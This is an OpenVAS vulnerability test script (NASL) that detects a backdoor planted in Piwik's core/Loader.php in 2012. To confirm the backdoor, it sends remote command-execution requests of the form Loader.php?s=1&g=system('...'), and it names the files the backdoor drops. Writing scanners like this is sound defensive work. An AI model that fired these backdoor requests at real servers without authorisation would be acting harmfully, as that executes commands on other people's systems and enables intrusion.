###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_piwik_backdoor_11_12.nasl 12 2013-10-27 11:15:33Z jan $
#
# Backdoor in Piwik analytics software
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "A backdoor has been added to the web server analytics Piwik which allows attackers to take control of a system. 

The Backdoor is in 'core/Loader.php' and create also the files:

lic.log
core/DataTable/Filter/Megre.php";

tag_solution = "See the References.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103611";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Backdoor in Piwik analytics software");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://piwik.org/blog/2012/11/security-report-piwik-org-webserver-hacked-for-a-few-hours-on-2012-nov-26th/");
 script_xref(name : "URL" , value : "http://forum.piwik.org/read.php?2,97666");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-11-27 13:36:59 +0100 (Tue, 27 Nov 2012)");
 script_description(desc);
 script_summary("Determine if Piwik contains a backdoor");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/piwik",cgi_dirs());
cmds = exploit_commands();

foreach dir (dirs) {
   
  url = dir + '/index.php';  

  if(http_vuln_check(port:port, url:url,pattern:"<title>Piwik")) {

    foreach cmd (keys(cmds)) {

      url = dir + "/core/Loader.php?s=1&g=system('" + cmds[cmd]  + "')";

      if(http_vuln_check(port:port, url:url,pattern:cmd)) {
     
        security_hole(port:port);
        exit(0);

      }
    }
  }
}

exit(0);

